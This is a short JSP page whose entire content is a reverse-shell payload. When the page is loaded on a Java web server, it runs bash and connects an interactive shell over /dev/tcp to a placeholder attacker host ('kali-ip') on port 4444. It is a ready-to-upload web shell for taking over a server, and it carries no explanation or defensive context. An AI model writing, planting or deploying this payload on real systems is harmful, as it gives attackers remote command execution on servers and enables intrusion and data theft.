<%@ page import="java.io.*" %>
<%
    String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/kali-ip/4444 0>&1"};
    Runtime.getRuntime().exec(cmd);
%>
